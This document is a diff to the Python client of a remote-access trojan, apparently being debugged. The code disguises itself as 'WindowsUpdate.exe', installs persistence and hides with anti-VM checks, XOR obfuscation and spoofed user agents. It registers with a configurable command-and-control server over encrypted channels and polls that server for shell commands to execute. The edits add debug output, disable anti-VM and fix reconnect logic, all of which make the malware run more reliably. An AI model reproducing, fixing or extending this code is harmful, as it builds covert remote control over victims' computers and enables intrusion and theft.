@@ -20,14 +20,14 @@ PERSISTENCE_PATH = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "S
 PAYLOAD_NAME = "WindowsUpdate.exe"  # Renamed to look legitimate
 
 # === CONFIG ===
-C2_DOMAIN = os.getenv("C2_DOMAIN", "http://127.0.0.1:443/")  # Replace with your server URL or set C2_DOMAIN env var
+C2_DOMAIN = os.getenv("C2_DOMAIN", "http://127.0.0.1:443").rstrip("/")  # Strip trailing slash to prevent double-slash URLs
 RETRY_DELAY = 30  # seconds
 POLLING_DELAY = 5  # Check for commands every N seconds
 JITTER = 2  # Random jitter +/- seconds added to polling
 MUTEX_NAME = "Global\\WindowsUpdateMutex"  # Prevent multiple instances
 LOCK_FILE = os.path.join(os.getenv("TEMP", "."), ".wupdate.lock")  # Lockfile fallback
 XOR_KEY = 0x5A  # Simple XOR key for payload obfuscation
-ANTI_VM = True  # Set to False if you're testing in a VM
+ANTI_VM = False  # Set to False if you're testing in a VM
 # ================
 
 # === STEALTH: Realistic User-Agent Pool ===
@@ -56,12 +56,19 @@ def fetch_server_rsa_pub():
     """Fetch server RSA public key during startup handshake"""
     global server_rsa_pub_key
     try:
-        resp = requests.get(f"{C2_DOMAIN}rsa_pub", timeout=10)
+        url = f"{C2_DOMAIN}/rsa_pub"
+        print(f"[*] Fetching RSA public key from {url}...")
+        resp = requests.get(url, timeout=10)
         if resp.status_code == 200 and resp.text.strip():
             server_rsa_pub_key = RSA.import_key(resp.text)
+            print("[+] RSA public key fetched successfully.")
             return True
-    except Exception:
-        pass
+        else:
+            print(f"[!] Failed to fetch RSA key. Status: {resp.status_code}")
+    except requests.exceptions.ConnectionError:
+        print(f"[!] Cannot connect to server at {C2_DOMAIN} — is server.py running?")
+    except Exception as e:
+        print(f"[!] Error fetching RSA key: {e}")
     return False
 
 def encrypt_aes(data: str) -> str:
@@ -99,10 +106,11 @@ def get_session():
 
 def c2_post(endpoint, data, timeout=10):
     """Send AES-encrypted POST (with RSA-encrypted session key for registration or direct AES for subsequent requests)"""
+    print(f"[*] Sending POST to {endpoint}...")
     global server_rsa_pub_key
     json_data = json.dumps(data)
     
-    if endpoint == "register":
+    if endpoint.strip("/") == "register":
         if not server_rsa_pub_key:
             fetch_server_rsa_pub()
         
@@ -115,31 +123,51 @@ def c2_post(endpoint, data, timeout=10):
                 "encrypted_session_key": enc_session_key,
                 "payload": encrypted_payload
             }
-            return get_session().post(
+            resp = get_session().post(
                 f"{C2_DOMAIN}{endpoint}",
                 data=json.dumps(hybrid_packet),
                 headers={"Content-Type": "application/json"},
                 timeout=timeout
             )
+            print(f"[*] Response from {endpoint}: {resp.status_code}")
+            if resp.status_code != 200:
+                print(f"[!] Server Error Detail: {resp.text}")
+            return resp
             
-    # Standard AES-encrypted request
+    # Standard AES-encrypted request — pass client_id as query param for server lookup
     encrypted = encrypt_aes(json_data)
-    return get_session().post(
+    params = {}
+    if client_id:
+        params["id"] = client_id
+    resp = get_session().post(
         f"{C2_DOMAIN}{endpoint}",
         data=encrypted,
         headers={"Content-Type": "application/octet-stream"},
+        params=params,
         timeout=timeout
     )
+    print(f"[*] Response from {endpoint}: {resp.status_code}")
+    if resp.status_code != 200:
+        print(f"[!] Server Error Detail: {resp.text}")
+    return resp
 
 def c2_get(endpoint, params=None, timeout=10):
-    """Send GET to C2 and decrypt AES response. Returns None on any decryption failure."""
+    """Send GET to C2 and decrypt AES response. Falls back to plain JSON if server has no session key (e.g. after restart)."""
+    print(f"[*] Polling {endpoint}...")
     resp = get_session().get(f"{C2_DOMAIN}{endpoint}", params=params, timeout=timeout)
     if resp.status_code == 200 and resp.text.strip():
         try:
             decrypted = decrypt_aes(resp.text)
             return json.loads(decrypted)
         except Exception:
-            return None
+            pass
+        # Fallback: server may have restarted without our session key
+        try:
+            data = json.loads(resp.text)
+            if isinstance(data, dict):
+                return data
+        except Exception:
+            pass
     return None
 
 
@@ -846,6 +874,7 @@ def preview_file(path):
 
 def execute_command(cmd):
     """Execute a command and return the result"""
+    print(f"[*] Executing command: {cmd}")
     global current_dir, POLLING_DELAY
 
     try:
@@ -1018,12 +1047,13 @@ def execute_command(cmd):
 
 def connect_c2():
     """Main C2 connection loop with encrypted comms and jitter"""
+    print("[*] Starting C2 connection loop...")
     global client_id
 
     while True:
         try:
-            # Random initial delay to avoid burst patterns
-            time.sleep(random.uniform(3, 8))
+            # Random initial delay to avoid burst patterns (shorter on re-register)
+            time.sleep(random.uniform(1, 2))
 
             # Gather real system info (use session UA even for IP lookup)
             try:
@@ -1051,7 +1081,15 @@ def connect_c2():
                 "admin": is_admin,
                 "client_id": client_id
             }
-            c2_post("/register", session_info)
+            print(f"[*] Registering client: {client_id}")
+            resp = c2_post("/register", session_info)
+            if resp and resp.status_code == 200:
+                print("[+] Registered successfully.")
+            else:
+                status = resp.status_code if resp else "No Response"
+                print(f"[-] Registration failed with status: {status}")
+                time.sleep(RETRY_DELAY)
+                continue # Try registration again
 
             # Command polling loop
             while True:
@@ -1070,6 +1108,9 @@ def connect_c2():
                                     "output": result,
                                     "client_id": client_id
                                 })
+                except requests.exceptions.ConnectionError:
+                    print("[!] Lost connection — reconnecting...")
+                    break
                 except Exception:
                     pass  # Never let a single command crash the polling loop
 
@@ -1077,12 +1118,19 @@ def connect_c2():
                 jitter = random.uniform(-JITTER, JITTER)
                 time.sleep(max(1, POLLING_DELAY + jitter))
 
+        except requests.exceptions.ConnectionError:
+            print(f"[!] Server unreachable — retrying in {RETRY_DELAY}s...")
+            time.sleep(RETRY_DELAY)
+        except requests.exceptions.Timeout:
+            print(f"[!] Request timed out — retrying in 5s...")
+            time.sleep(5)
         except Exception:
             time.sleep(RETRY_DELAY)
 
 
 if __name__ == "__main__":
-    hide_console()
+    # hide_console()
+    print("[*] Client started. Debug mode active.")
     check_single_instance()
 
     # Anti-analysis: exit silently if VM/sandbox or debugger detected
